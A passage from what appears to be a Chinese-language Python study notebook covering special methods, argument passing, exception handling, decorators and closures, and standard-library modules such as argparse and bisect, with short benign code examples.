<p><code>__len__</code>方法实现内置函数 <a href="https://docs.python.org/zh-cn/3/library/functions.html#len"><code>len()</code></a>。应该返回对象的长度，以一个 <code>&gt;=</code> 0 的整数表示。此外，如果一个对象未定义 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__bool__"><code>__bool__()</code></a> 方法而其 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__len__"><code>__len__()</code></a> 方法返回值为零，则在布尔运算中会被视为假值。</p>
<p><code>__bool__</code>方法实现真值检测以及内置的 <code>bool()</code> 操作；应该返回 <code>False</code> 或 <code>True</code>。</p>
<h2 id="模拟可调用对象-star"><a class="header" href="#模拟可调用对象-star">模拟可调用对象 :star:</a></h2>
<pre><code class="language-python">object.__call__(self[, args...])
</code></pre>
<p>如果定义了这个方法，那么下面两种写法是大致等价的。</p>
<pre><code class="language-python">x(arg1,arg2...) 
type(x).__call__(x,arg1,arg2,...)
</code></pre>
<p>所以，<code>type</code>类型的<code>__call__</code>其实是<code>__init__</code>函数？我们不妨来做一个实验，可以发现确实如此。</p>
<pre><code class="language-python">class A():
    def __init__(self,data):
        self.data = data

    def __call__(self):
        print(&quot;data = &quot;,self.data)

a = A(1)
a()
b = type(type(a))
b = b.__call__(A,2)
b()
</code></pre>
<p>也就是说，我们平时在产生实例的时候调用的</p>
<pre><code class="language-python">a = A(args)
</code></pre>
<p>其实等价于下面的代码。</p>
<pre><code class="language-python">type(A).__call__(A,args)	# type(A) 就是 type
type.__call__(A,args)
</code></pre>
<p>不过遗憾的是type的<code>__call__</code>是用C写的（对于CPython来说），如果把他翻译成Python代码，大概如下，可以注意到<code>__init__</code>并不是一定被调用的，除非<code>__new__</code>返回了类的实例。</p>
<pre><code class="language-python"># type's __call__ method which gets called when Human class is called i.e. Human()
def __call__(cls, *args, **kwargs):
    obj = cls.__new__(*args, **kwargs)
    if obj is not None and isinstance(obj, cls) and hasattr(obj, '__init__'):
        obj.__init__(*args, **kwargs)
    return obj
</code></pre>
<h2 id="模拟容器类型"><a class="header" href="#模拟容器类型">模拟容器类型</a></h2>
<pre><code class="language-python">object.__len__(self)
object.__length_hint__(self)
object.__getitem__(self, key)
object.__setitem__(self, key, value)
object.__delitem__(self, key)
object.__missing__(self, key)
object.__contains__(self, item)
object.__reversed__(self)

object.__iter__(self)
object.__next__(self)
</code></pre>
<p>实现索引和<code>__index__</code>没有关系，和<code>__getitem__</code>有关系。如果需要实现<code>x[key]</code>的索引方法，就需要实现为x实现<code>__getitem__</code>方法。</p>
<pre><code class="language-python">class A():
    data = [1,2,3]
    def __getitem__(self,key):
        return self.data[key]


a = A()
print(a[1])
</code></pre>
<ul>
<li>如果我传入<code>a[&quot;1&quot;]</code>，那么会产生一个<code>TypeError</code>。</li>
<li>如果我传入<code>a[4]</code>，那么会产生<code>IndexError</code>。</li>
<li>如果我传入<code>a[1:]</code>，那么实际调用的是<code>a.__getitem__(slice(1,None,None))</code>。</li>
</ul>
<p>一般我们对<code>__getitem__</code>的实现都是访问对象内的某个字典或列表。</p>
<h2 id="算数"><a class="header" href="#算数">算数</a></h2>
<p>具体请参考<a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#emulating-numeric-types">Python标准库</a>。如果你并非实现一个数学库，请不要重载这些方法。</p>
<pre><code class="language-python"># 调用这些方法来实现二进制算术运算
# (+, -, *, @, /, //, %, divmod(), pow(), **, &lt;&lt;, &gt;&gt;, &amp;, ^, |)。
object.__add__(self, other)
object.__sub__(self, other)
object.__mul__(self, other)
object.__matmul__(self, other)
object.__truediv__(self, other)
object.__floordiv__(self, other)
object.__mod__(self, other)
object.__divmod__(self, other)
object.__pow__(self, other[, modulo])
object.__lshift__(self, other)
object.__rshift__(self, other)
object.__and__(self, other)
object.__xor__(self, other)
object.__or__(self, other)

# 调用这些方法来实现具有反射（交换）操作数的二进制算术运算
# (+, -, *, @, /, //, %, divmod(), pow(), **, &lt;&lt;, &gt;&gt;, &amp;, ^, |)。
object.__radd__(self, other)
object.__rsub__(self, other)
object.__rmul__(self, other)
object.__rmatmul__(self, other)
object.__rtruediv__(self, other)
object.__rfloordiv__(self, other)
object.__rmod__(self, other)
object.__rdivmod__(self, other)
object.__rpow__(self, other[, modulo])
object.__rlshift__(self, other)
object.__rrshift__(self, other)
object.__rand__(self, other)
object.__rxor__(self, other)
object.__ror__(self, other)

# 调用这些方法来实现扩展算术赋值
# (+=, -=, *=, @=, /=, //=, %=, **=, &lt;&lt;=, &gt;&gt;=, &amp;=, ^=, |=)。
object.__iadd__(self, other)
object.__isub__(self, other)
object.__imul__(self, other)
object.__imatmul__(self, other)
object.__itruediv__(self, other)
object.__ifloordiv__(self, other)
object.__imod__(self, other)
object.__ipow__(self, other[, modulo])
object.__ilshift__(self, other)
object.__irshift__(self, other)
object.__iand__(self, other)
object.__ixor__(self, other)¶
object.__ior__(self, other)

# 调用此方法以实现一元算术运算 (-, +, abs() 和 ~)。
object.__neg__(self)
object.__pos__(self)
object.__abs__(self)
object.__invert__(self)

# 调用这些方法以实现内置函数 complex(), int() 和 float()。应当返回一个相应类型的值。 
object.__complex__(self)
object.__int__(self)
object.__float__(self)

# 调用这些方法以实现内置函数 round() 以及 math 函数 trunc(), floor() 和 ceil()。 
object.__round__(self[, ndigits])
object.__trunc__(self)
object.__floor__(self)
object.__ceil__(self)
</code></pre>
<p>不过下面这个方法是值得重载的</p>
<pre><code class="language-python">object.__index__(self)
</code></pre>
<p>调用此方法以实现 <code>operator.index()</code> 以及 Python 需要<strong>无损地将数字对象转换为整数对象</strong>的场合（例如切片或是内置的 <code>bin()</code>, <code>hex()</code> 和 <code>oct()</code> 函数)。 如果未定义 <code>__int__()</code>, <code>__float__()</code> 和 <code>__complex__()</code> 则相应的内置函数 <code>int()</code>, <code>float()</code> 和 <code>complex()</code> 将回退为 <code>__index__()</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="参数-1"><a class="header" href="#参数-1">参数</a></h1>
<h2 id="基础知识-1"><a class="header" href="#基础知识-1">基础知识</a></h2>
<blockquote>
<p>参数的传递是通过自动<strong>将对象赋值给局部变量名</strong>实现的。因为变量实际上是引用（指针），所以<strong>没有任何复制</strong>发生在参数的传递中。</p>
<p>在函数内部赋值参数名不会影响调用者。在函数运行时，函数头部的参数名是一个新的局部的变量名，这个变量名是在函数的局部作用域内的。函数参数名和调用者作用域中的变量名是没有关联的。</p>
<p>改变函数的<strong>可变对象的参数值</strong>也许会对调用者有影响。因为是直接把传入的对象赋值给参数，函数能够原位置改变传入的可变对象。也可以利用此让可变对象作为函数的输出。</p>
</blockquote>
<pre><code class="language-python">def func(a):
    a.append(1)
    
a = []
func(a)
</code></pre>
<p>实际上，用下面这个图就可以解释上面所有的事情。如果你对Rust熟悉的话，也可以用<code>&amp;mut a</code>来理解可变对象参数，用<code>&amp;a</code>来理解不可变对象参数。如果你对C语言熟悉的话，用<code>void* a</code>来理解可变对象参数，用<code>const void* a</code>来理解不可变对象参数。</p>
<p><img src="Language/Python/1%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/../images/argpass.drawio.svg" alt="argpass" /></p>
<p>如果你想避免对可变引用的改变，可以传入可变引用的<strong>复制</strong>。</p>
<h2 id="参数匹配"><a class="header" href="#参数匹配">参数匹配</a></h2>
<p>Python的参数传递是非常灵活的。对于一些高级特性，可能在用库的时候会见到，<strong>自己写的时候一般不要这么复杂</strong>。有下面这些匹配方式，同时下面的也是参数从左到右的顺序，否则会有二义性。</p>
<ul>
<li>位置次序：从左至右匹配。</li>
<li>关键字参数：通过<code>name=value</code>这种语法来指定函数中哪个参数接受哪个值。</li>
<li>默认值参数：为没有传入值的可选参数指定参数值。</li>
<li>可变长参数：函数能够用<code>*</code>或者<code>**</code>开头的特殊参数来收集任意多的额外参数。</li>
<li>keyword-only参数：只能通过<code>name=value</code>这种语法来指定函数中哪个参数接受哪个值。</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>语法</th><th>解释</th></tr></thead><tbody>
<tr><td><code>def func(name)</code></td><td>常规参数，通过位置或名称匹配</td></tr>
<tr><td><code>def func(name=value)</code></td><td>默认值参数，如果没有传参的话</td></tr>
<tr><td><code>def func(*name)</code></td><td>将剩下的<strong>基于位置匹配的参数</strong>打包到name，作为一个tuple</td></tr>
<tr><td><code>def func(**name)</code></td><td>将剩下的<strong>基于关键字匹配的参数</strong>打包到name，作为dict</td></tr>
<tr><td><code>def func(*other, name)</code></td><td>name必须通过关键字传入</td></tr>
<tr><td><code>def func(*other, name=value)</code></td><td>name必须通过关键字传入</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="多继承"><a class="header" href="#多继承">多继承</a></h1>
<p>在拥有多继承的面向对象模型中，super.xxx应该调用哪个父类的方法？</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="高级写法"><a class="header" href="#高级写法">高级写法</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exception-1"><a class="header" href="#exception-1">Exception</a></h1>
<p>也许你在学习C++的时候，会被告诫“少用异常”，或者是“不要用异常去实现正常的逻辑”。不过在Python的世界里，好像并不是这样的。比如迭代器的实现就依赖于异常。</p>
<h2 id="异常的功能"><a class="header" href="#异常的功能">异常的功能</a></h2>
<ol>
<li>错误处理：每当在运行时检查到（Python没有编译这个过程）程序错误时，Python就会引发异常。可以在程序代码中捕捉和响应错误，或者忽略已经发生的异常。如果忽略错误，<strong>Python默认的异常处理</strong>行为将会启动：停止程序并打印错误消息。如果不想启动这种默认行为，就要编写try语句来捕获异常并从中回复。</li>
<li>事件通知：异常可以用于发出有效状态的信号，而无需在程序中四处传递结果标签。如，搜索算法可以在搜索失败的时候引发异常，而不是返回一个整数结果码。</li>
<li>特殊情况处理：有时发生了某种极其罕见的勤快，可以通过程序更高层面的异常处理器处理这种情况。比如用assert语句在开发过程中检查条件是否与期望中的一致。</li>
<li>终止行为：try-finally语句可以确保某些必要的结束操作，with语句在这方面提供了一种替代方案。</li>
<li>非常规控制流：你可以把它当做<code>goto</code>使用，比如用raise来跳出多重循环。</li>
</ol>
<h2 id="触发异常"><a class="header" href="#触发异常">触发异常</a></h2>
<ol>
<li>assert()</li>
<li>raise from</li>
</ol>
<p>try-except-finally</p>
<h2 id="exception-usage"><a class="header" href="#exception-usage">Exception usage</a></h2>
<h3 id="basic-example"><a class="header" href="#basic-example">Basic Example</a></h3>
<pre><code class="language-python">try:
    &lt;code&gt;
except &lt;exception&gt;:
    &lt;code&gt;
</code></pre>
<h3 id="complex-example"><a class="header" href="#complex-example">Complex Example</a></h3>
<pre><code class="language-python">try:
    &lt;code_1&gt;
except &lt;exception_a&gt;:
    &lt;code_2_a&gt;
except &lt;exception_b&gt;:
    &lt;code_2_b&gt;
else:
    &lt;code_2_c&gt;
finally:
    &lt;code_3&gt;
</code></pre>
<ul>
<li>Code inside the <code>'else'</code> block will only be executed if <code>'try'</code> block had no exceptions.</li>
<li>Code inside the <code>'finally'</code> block will always be executed (unless a signal is received).</li>
</ul>
<h3 id="catching-exceptions"><a class="header" href="#catching-exceptions">Catching Exceptions</a></h3>
<pre><code class="language-python">except &lt;exception&gt;:
except &lt;exception&gt; as &lt;name&gt;:
except (&lt;exception&gt;, [...]):
except (&lt;exception&gt;, [...]) as &lt;name&gt;:
</code></pre>
<ul>
<li>Also catches subclasses of the exception.</li>
<li>Use <code>'traceback.print_exc()'</code> to print the error message to stderr.</li>
<li>Use <code>'print(&lt;name&gt;)'</code> to print just the cause of the exception (its arguments).</li>
</ul>
<h3 id="raising-exceptions"><a class="header" href="#raising-exceptions">Raising Exceptions</a></h3>
<pre><code class="language-python">raise &lt;exception&gt;
raise &lt;exception&gt;()
raise &lt;exception&gt;(&lt;el&gt; [, ...])
</code></pre>
<h4 id="re-raising-caught-exception"><a class="header" href="#re-raising-caught-exception">Re-raising caught exception:</a></h4>
<pre><code class="language-python">except &lt;exception&gt; as &lt;name&gt;:
    ...
    raise
</code></pre>
<h3 id="exception-object"><a class="header" href="#exception-object">Exception Object</a></h3>
<pre><code class="language-python">arguments = &lt;name&gt;.args
exc_type  = &lt;name&gt;.__class__
filename  = &lt;name&gt;.__traceback__.tb_frame.f_code.co_filename
func_name = &lt;name&gt;.__traceback__.tb_frame.f_code.co_name
line      = linecache.getline(filename, &lt;name&gt;.__traceback__.tb_lineno)
error_msg = ''.join(traceback.format_exception(exc_type, &lt;name&gt;, &lt;name&gt;.__traceback__))
</code></pre>
<h3 id="built-in-exceptions"><a class="header" href="#built-in-exceptions">Built-in Exceptions</a></h3>
<pre><code>BaseException
 +-- SystemExit                   # Raised by the sys.exit() function.
 +-- KeyboardInterrupt            # Raised when the user hits the interrupt key (ctrl-c).
 +-- Exception                    # User-defined exceptions should be derived from this class.
      +-- ArithmeticError         # Base class for arithmetic errors.
      |    +-- ZeroDivisionError  # Raised when dividing by zero.
      +-- AttributeError          # Raised when an attribute is missing.
      +-- EOFError                # Raised by input() when it hits end-of-file condition.
      +-- LookupError             # Raised when a look-up on a collection fails.
      |    +-- IndexError         # Raised when a sequence index is out of range.
      |    +-- KeyError           # Raised when a dictionary key or set element is not found.
      +-- NameError               # Raised when a variable name is not found.
      +-- OSError                 # Errors such as “file not found” or “disk full” (see Open).
      |    +-- FileNotFoundError  # When a file or directory is requested but doesn't exist.
      +-- RuntimeError            # Raised by errors that don't fall into other categories.
      |    +-- RecursionError     # Raised when the maximum recursion depth is exceeded.
      +-- StopIteration           # Raised by next() when run on an empty iterator.
      +-- TypeError               # Raised when an argument is of wrong type.
      +-- ValueError              # When an argument is of right type but inappropriate value.
           +-- UnicodeError       # Raised when encoding/decoding strings to/from bytes fails.
</code></pre>
<h4 id="collections-and-their-exceptions"><a class="header" href="#collections-and-their-exceptions">Collections and their exceptions:</a></h4>
<pre><code>+-----------+------------+------------+------------+
|           |    List    |    Set     |    Dict    |
+-----------+------------+------------+------------+
| getitem() | IndexError |            |  KeyError  |
| pop()     | IndexError |  KeyError  |  KeyError  |
| remove()  | ValueError |  KeyError  |            |
| index()   | ValueError |            |            |
+-----------+------------+------------+------------+
</code></pre>
<h4 id="useful-built-in-exceptions"><a class="header" href="#useful-built-in-exceptions">Useful built-in exceptions:</a></h4>
<pre><code class="language-python">raise TypeError('Argument is of wrong type!')
raise ValueError('Argument is of right type but inappropriate value!')
raise RuntimeError('None of above!')
</code></pre>
<h3 id="user-defined-exceptions"><a class="header" href="#user-defined-exceptions">User-defined Exceptions</a></h3>
<pre><code class="language-python">class MyError(Exception):
    pass

class MyInputError(MyError):
    pass
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="装饰器"><a class="header" href="#装饰器">装饰器</a></h1>
<blockquote>
<p>By definition, a decorator is a function that takes another function and extends the behavior of the latter function without explicitly modifying it.</p>
</blockquote>
<p>装饰器可以让我们在不修改一个函数的情况下，扩展函数的功能。让我们的代码更加优雅。<a href="https://foofish.net/python-decorator.html">这篇文章</a>写的很清楚，<a href="https://realpython.com/primer-on-python-decorators/">这篇英文文章</a>更清楚。 至于原理，我是参考的《Fluent Python》。</p>
<h2 id="如何使用装饰器"><a class="header" href="#如何使用装饰器">如何使用装饰器</a></h2>
<p>我们的目标是，让函数每一次使用的时候都输出函数的使用时间。最简单的，我们可以这样：</p>
<pre><code class="language-python">import time

def print_time(func):
    print(time.strftime(&quot;Time: %H:%M:%S&quot;,time.gmtime()))
    func()

def foo():
    print(&quot;I'm foo&quot;)

print_time(foo)
</code></pre>
<p>但是这样，我们每次调用<code>foo</code>的时候都要调用<code>print_time(foo)</code>。我们通过一个简单的装饰器来完成这个任务。我们用wrapper把函数包装了起来，并且这样还能很好的处理参数。</p>
<pre><code class="language-python">import time

def print_time(func):
    def wrapper(num):
        print(time.strftime(&quot;Time: %H:%M:%S&quot;,time.gmtime()))
        func(num)
    return wrapper

def foo(num):
    print(&quot;We are {} foo&quot;.format(num))

foo = print_time(foo)
foo(2)
</code></pre>
<p>Python提供了一个语法糖<code>@</code>，让我们用更简单的办法完成这件事情。<code>@my_decorator</code> 是  <code>func = my_decorator(func)</code>的简单写法。</p>
<p>另外注意<code>wrapper(*args, **kwargs)</code>，这样就能处理任意多个参数的情况了。</p>
<pre><code class="language-python">import time

def print_time(func):
    #注意这个参数的写法，可以处理任意多的参数
    def wrapper(*args, **kwargs):
        print(time.strftime(&quot;Time: %H:%M:%S&quot;,time.gmtime()))
        #这样能处理有返回值的情况，虽然func没有
        return func(*args, **kwargs)
    return wrapper

#@语法糖
@print_time
def foo(num):
    print(&quot;We are {} foo&quot;.format(num))

foo(2)
</code></pre>
<p>还可以包装上额外的参数。<code>@print_time</code>等价于<code>foo = print_time(foo)</code>，注意到函数<code>print_time</code>返回的是一个函数，就可以理解了。</p>
<p>另外注意到decorator的作用域其实应该是仅限于print_time的，此处是一个闭包。</p>
<p>另外用包装器封装会失去函数的metadata，我们使用<code>@wraps(func)</code>来解决这个问题。通过这个装饰器把func的metadata复制到decorator里去。来看一个例子<code>@debug</code>，提供调试信息的输出。注意f-string是Python3.6版本之后才有的新特性。</p>
<pre><code class="language-python">import functools

def debug(func):
    &quot;&quot;&quot;Print the function signature and return value&quot;&quot;&quot;
    @functools.wraps(func)
    def wrapper_debug(*args, **kwargs):
        args_repr = [repr(a) for a in args]                      # 1
        kwargs_repr = [f&quot;{k}={v!r}&quot; for k, v in kwargs.items()]  # 2
        signature = &quot;, &quot;.join(args_repr + kwargs_repr)           # 3
        print(f&quot;Calling {func.__name__}({signature})&quot;)
        value = func(*args, **kwargs)
        print(f&quot;{func.__name__!r} returned {value!r}&quot;)           # 4
        return value
    return wrapper_debug

class A:
    @debug
    def func(self):
        pass
</code></pre>
<p>如果装饰器还需要参数，就这么写。上面的理解成<code>func = debug(func)</code>，下面的理解成<code>func = debug(&quot;Warning&quot;)(func)</code>。</p>
<pre><code class="language-python">def debug(text):
    def _debug(func):
        &quot;&quot;&quot;Print the function signature and return value&quot;&quot;&quot;
        @functools.wraps(func)
        def wrapper_debug(*args, **kwargs):
            args_repr = [repr(a) for a in args]                      # 1
            kwargs_repr = [f&quot;{k}={v!r}&quot; for k, v in kwargs.items()]  # 2
            signature = &quot;, &quot;.join(args_repr + kwargs_repr)           # 3
            print(text, f&quot;Calling {func.__name__}({signature})&quot;)
            value = func(*args, **kwargs)
            print(text, f&quot;{func.__name__!r} returned {value!r}&quot;)           # 4
            return value
        return wrapper_debug
    return _debug


class A:
    @debug(&quot;Warning&quot;) 
    def func(self):
        pass
</code></pre>
<h2 id="常用装饰器-star"><a class="header" href="#常用装饰器-star">常用装饰器 :star:</a></h2>
<p>内置装饰器：<code>@staticmathod</code>、<code>@classmethod</code>、<code>@property</code>。我们在介绍python的类的时候提到。</p>
<ul>
<li><strong>@property</strong>：把类内方法当成属性来使用，必须要有返回值，相当于getter；</li>
<li><strong>@staticmethod</strong>：静态方法，取消第一个参数self。</li>
<li><strong>@classmethod</strong>：类方法，第一个参数转变成表示自身类的cls参数。</li>
</ul>
<p>在面向对象（OOP）的设计模式中，decorator被称为装饰模式。和这个长得比较像的Rust的过程宏，他更加简单。</p>
<pre><code class="language-python"># @property的常用方法如下
class A:
    @property 
    def x(self):
        &quot;I am the 'x' property.&quot; 
        return self._x
    
    @x.setter 
    def x(self, value):
        self._x = value

    @x.deleter 
    def x(self):
        del self._x
        
a = A()
a.x = 1     # setter
print(a.x)  # getter
del a.x     # deleter
</code></pre>
<p>https://www.zhihu.com/question/299219511/answer/2296455008</p>
<h2 id="深入理解装饰器"><a class="header" href="#深入理解装饰器">深入理解装饰器</a></h2>
<h3 id="python什么时候运行装饰器"><a class="header" href="#python什么时候运行装饰器">Python什么时候运行装饰器</a></h3>
<p>答案是，装饰器在函数定义之后立即运行，而不是在函数第一次执行时运行。其实原因也是比较显然的，你写<code>def</code>的时候产生一个实例嘛。</p>
<h3 id="闭包-1"><a class="header" href="#闭包-1">闭包</a></h3>
<p>多数装饰器会修改被装饰的函数。通常会像上面的例子一样，定义一个内部函数，然后把它返回替换被装饰的函数。使用内部函数的代码几乎都要依靠闭包才能正常运作。</p>
<p>首先我们要了解python中变量的<strong>作用域</strong>。变量有全局变量和局部变量。下面的例子中，a,c就只有局部作用域，而b是全局变量。要在函数中引用全局变量，应该用global关键字声明。在Python中没有变量声明这个东西。对一个变量进行赋值的动作就是声明。所以在下面的例子中，如果你把<code>global b</code>删除，那么最后<code>print(b)</code>得到的将会是1，函数中的b是局部变量，和全局变量b没有关系。</p>
<pre><code class="language-python">def f(a):
    global b
    c=1
    b=2
    print(a)
    print(b)
    print(c)

b=1
f(1)
print(b)
</code></pre>
<p>我们再来看这样一个求平均数的例子。每次调用avg都可以求之前所有数字的平均。可是，series是make_average的局部变量，因为在那个函数中初始化了series变量。可是在我们调用avg函数的时候，make_average早就已经返回了，它的本地作用域也一起不复返了。</p>
<p>对于average函数来说，series是<strong>自由变量(free variable)</strong>，指未在本地作用域中绑定的变量。函数average的闭包包括了series的声明。不过我们之前也提到了，对一个变量的赋值在python中起到了声明的效果。所以和上面的<code>global</code>关键字类似，为了把变量声明为自由变量而不是局部变量，我们使用<code>nonlocal</code>关键字。</p>
<pre><code class="language-python">def make_average():
    series = []
    def average(new):
        nonlocal series			#在这个函数中不是必要的，因为我们没有给series赋值
        series.append(new)
        total = sum(series)
        return total/len(series)
    return average

avg = make_average()

print(avg(1))
print(avg(3))
</code></pre>
<p>如果你想查看一下自由变量，可以执行一下<code>print(avg.__code__.co_freevars)</code>。</p>
<h3 id="函数就是对象"><a class="header" href="#函数就是对象">函数就是对象</a></h3>
<p>在python中函数就是一个对象，或者说，函数是一个callable的对象，对象如果callable，那么它也能表现的像一个函数。怎么让一个函数callable呢？定义一个<code>__call__</code>方法。</p>
<p>我们使用<code>dir</code>内置函数查看一下函数都有哪些属性，其中有一些属性是所有的对象共有的，有一些属性是所有的函数都有的：</p>
<pre><code class="language-python">&gt;&gt;&gt; def a():
...     '''demo'''
...     return 1
...
&gt;&gt;&gt; dir(a)
['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
</code></pre>
<ul>
<li><code>__name__</code>：函数的名字，str</li>
<li><code>__globals__</code>：函数所在模块中的全局变量，dict</li>
<li><code>__closure__</code>：函数闭包，即自由变量的绑定，tuple</li>
<li><code>__default__</code>：形式参数的默认值，tuple</li>
<li><code>__annotations__</code>：参数和返回值的注解，dict</li>
<li><code>__code__</code>：编译成字节码的函数metadata和函数定义体</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pythonlib"><a class="header" href="#pythonlib">PythonLib</a></h1>
<p>这里介绍Python的标准库和一些非常好用的第三方库。我尝试按照我的思路将他们归类。详细请参考<a href="https://docs.python.org/zh-cn/3.9/library/index.html">官方文档</a>。我不是一个专业的Python程序员，我只是用它来写一些小脚本，我发现我最常用的库就是内置的字符串和<a href="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/Regex.html">正则表达式</a>，以及<a href="Language/Python/4%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BA%93/FS.html">文件系统</a>相关的库了。</p>
<h2 id="算法库"><a class="header" href="#算法库">算法库</a></h2>
<ul>
<li>文本处理
<ul>
<li><input disabled="" type="checkbox" checked=""/>
正则表达式 <code>re</code></li>
<li><input disabled="" type="checkbox"/>
base64编码和解码 <code>base64</code></li>
<li><input disabled="" type="checkbox"/>
JSON解析 <code>json</code></li>
<li><input disabled="" type="checkbox"/>
二进制数据处理 <code>struct</code></li>
</ul>
</li>
<li>数据结构和算法
<ul>
<li><input disabled="" type="checkbox"/>
容器数据类型 <code>collections</code></li>
<li><input disabled="" type="checkbox"/>
二分查找 <code>binect</code></li>
</ul>
</li>
<li>加密和哈希
<ul>
<li><input disabled="" type="checkbox"/>
哈希 <code>hashlib</code></li>
<li><input disabled="" type="checkbox"/>
加密（第三方） <code>cryptography</code></li>
</ul>
</li>
<li>并发，似乎由于Python的GIL限制，基于线程的并发并不高效。
<ul>
<li><input disabled="" type="checkbox"/>
基于线程的并发 <code>threading</code></li>
<li><input disabled="" type="checkbox"/>
基于进程的并发 <code>multiprocessing</code></li>
</ul>
</li>
</ul>
<h2 id="和外界交互的标准库"><a class="header" href="#和外界交互的标准库">和外界交互的标准库</a></h2>
<ul>
<li>
<p>与网络进行交互</p>
<ul>
<li><input disabled="" type="checkbox"/>
底层网络接口 <code>socket</code></li>
<li><input disabled="" type="checkbox"/>
HTTP库（第三方） <code>requests</code></li>
</ul>
</li>
<li>
<p>和文件系统进行交互</p>
<ul>
<li><input disabled="" type="checkbox" checked=""/>
直接利用操作系统的接口 <code>os.path</code></li>
<li><input disabled="" type="checkbox" checked=""/>
面向对象的文件系统路径 <code>pathlib</code></li>
<li><input disabled="" type="checkbox" checked=""/>
高阶文件操作 <code>shutil</code></li>
<li><input disabled="" type="checkbox"/>
生成临时文件和目录 <code>tempfile</code></li>
</ul>
</li>
<li>
<p>和操作系统进行交互 <code>os</code></p>
<ul>
<li><input disabled="" type="checkbox" checked=""/>
<code>time</code>, <code>datetime</code></li>
</ul>
</li>
<li>
<p>和其他程序进行交互</p>
</li>
</ul>
<h2 id="实现一些特定功能的标准库"><a class="header" href="#实现一些特定功能的标准库">实现一些特定功能的标准库</a></h2>
<ul>
<li>实现交互式命令行可能需要的库：<code>rlcompleter</code>和<code>readline</code></li>
<li>实现命令行程序：<code>argparse</code></li>
<li>测试</li>
<li>文档</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="命令行参数"><a class="header" href="#命令行参数">命令行参数</a></h1>
<h2 id="sys"><a class="header" href="#sys">sys</a></h2>
<pre><code class="language-python">import sys
scripts_path = sys.argv[0]
arguments    = sys.argv[1:]
</code></pre>
<h2 id="argparse"><a class="header" href="#argparse">argparse</a></h2>
<pre><code class="language-python">from argparse import ArgumentParser, FileType
p = ArgumentParser(description=&lt;str&gt;)
p.add_argument('-&lt;short_name&gt;', '--&lt;name&gt;', action='store_true')  # Flag.
p.add_argument('-&lt;short_name&gt;', '--&lt;name&gt;', type=&lt;type&gt;)          # Option.
p.add_argument('&lt;name&gt;', type=&lt;type&gt;, nargs=1)                    # First argument.
p.add_argument('&lt;name&gt;', type=&lt;type&gt;, nargs='+')                  # Remaining arguments.
p.add_argument('&lt;name&gt;', type=&lt;type&gt;, nargs='*')                  # Optional arguments.
args  = p.parse_args()                                            # Exits on error.
value = args.&lt;name&gt;
</code></pre>
<ul>
<li>Use <code>'help=&lt;str&gt;'</code> to set argument description.</li>
<li>Use <code>'default=&lt;el&gt;'</code> to set the default value.</li>
<li>Use <code>'type=FileType(&lt;mode&gt;)'</code> for files.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bisect"><a class="header" href="#bisect">Bisect</a></h1>
<p>模块包含两个主要函数，<code>bisect</code>和<code>insort</code>，都利用<strong>二分查找</strong>在<strong>有序序列</strong>中查找或插入元素。</p>
<h2 id="bisect-1"><a class="header" href="#bisect-1">bisect</a></h2>
<pre><code class="language-python">bisect_left(a, x, lo=0, hi=len(a), *, key=None)
bisect_right(a, x, lo=0, hi=len(a), *, key=None)
</code></pre>
<p>在序列<code>a</code>中找到<code>x</code>合适的<strong>插入点</strong>以维持有序，查找的范围是<code>[lo,hi)</code>。<code>key</code>是带有单个参数的key function，用于从每个输入元素中提取比较键，默认是<strong>升序序列</strong>。</p>
<p><code>bisect_left</code>返回的插入点是已存在元素x的左侧，<code>bisect_right</code>返回的是已存在元素x的右侧。</p>
<h2 id="insort"><a class="header" href="#insort">insort</a></h2>
<pre><code class="language-python">insort_left(a, x, lo=0, hi=len(a), *, key=None)
insort_right(a, x, lo=0, hi=len(a), *, key=None)
</code></pre>
<p>在序列<code>a</code>中找到<code>x</code>合适的<strong>插入点</strong>并<strong>插入</strong><code>x</code>以维持有序。</p>
<p><code>insort_left</code>插入已存在元素x的左侧，<code>insort_right</code>插入已存在元素x的右侧。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="builtin"><a class="header" href="#builtin">Builtin</a></h1>
<h2 id="容器"><a class="header" href="#容器">容器</a></h2>
<p>https://docs.python.org/3.8/library/stdtypes.html#built-in-types</p>
<h3 id="list-2"><a class="header" href="#list-2">List</a></h3>
<div class="table-wrapper"><table><thead><tr><th>切片操作</th><th>说明</th></tr></thead><tbody>
<tr><td><code>x in s</code></td><td>如果 <em>s</em> 中的某项等于 <em>x</em> 则结果为 <code>True</code>，否则为 <code>False</code></td></tr>
<tr><td><code>x not in s</code></td><td>如果 <em>s</em> 中的某项等于 <em>x</em> 则结果为 <code>False</code>，否则为 <code>True</code></td></tr>
<tr><td><code>s + t</code></td><td><em>s</em> 与 <em>t</em> 相拼接</td></tr>
<tr><td><code>s * n</code> 或 <code>n * s</code></td><td>相当于 <em>s</em> 与自身进行 <em>n</em> 次拼接</td></tr>
<tr><td><code>s[i]</code></td><td><em>s</em> 的第 <em>i</em> 项，起始为 0</td></tr>
<tr><td><code>s[i:j]</code></td><td><em>s</em> 从 <em>i</em> 到 <em>j</em> 的切片</td></tr>
<tr><td><code>s[i:j:k]</code></td><td><em>s</em> 从 <em>i</em> 到 <em>j</em> 步长为 <em>k</em> 的切片</td></tr>
<tr><td><code>len(s)</code></td><td><em>s</em> 的长度</td></tr>
